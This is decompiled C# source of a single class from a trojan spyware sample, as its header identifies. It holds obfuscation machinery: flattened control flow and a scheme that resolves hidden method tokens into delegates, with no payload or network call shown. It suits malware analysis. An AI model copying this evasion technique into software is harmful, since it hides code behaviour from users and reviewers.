// Decompiled with JetBrains decompiler
// Type: ArrayWithOff.Licensing.ContextComparatorLicense
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace ArrayWithOff.Licensing
{
  internal class ContextComparatorLicense
  {
    internal static Module m_MessageParser;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void RegisterPool(int typemdt)
    {
      int num1 = 0;
      if (true)
        goto label_3;
label_1:
      FieldInfo fieldInfo;
      MethodInfo method = (MethodInfo) ContextComparatorLicense.m_MessageParser.ResolveMethod(fieldInfo.MetadataToken + 100663296);
      Type type;
      fieldInfo.SetValue((object) null, (object) (MulticastDelegate) Delegate.CreateDelegate(type, method));
      int index;
      ++index;
      goto label_5;
label_2:
      int num2;
      num1 = num2;
label_3:
      FieldInfo[] fields;
      switch (num1)
      {
        case 0:
          type = ContextComparatorLicense.m_MessageParser.ResolveType(33554432 + typemdt);
          num2 = 5;
          goto label_2;
        case 1:
        case 2:
          goto label_1;
        case 3:
        case 4:
          break;
        case 5:
          fields = type.GetFields();
          index = 0;
          break;
        case 6:
          return;
        default:
          num2 = 4;
          goto label_2;
      }
label_5:
      if (index >= fields.Length)
      {
        num1 = 6;
        goto label_3;
      }
      else
      {
        fieldInfo = fields[index];
        num2 = 1;
        goto label_2;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ContextComparatorLicense()
    {
      ProxyParser.NewPool();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static ContextComparatorLicense()
    {
      ProxyParser.NewPool();
      ContextComparatorLicense.m_MessageParser = typeof (ContextComparatorLicense).Assembly.ManifestModule;
    }

    internal static bool FillPool() => true;

    internal static bool ConnectPool() => false;

    internal delegate void TemplateMapStub(object o);
  }
}
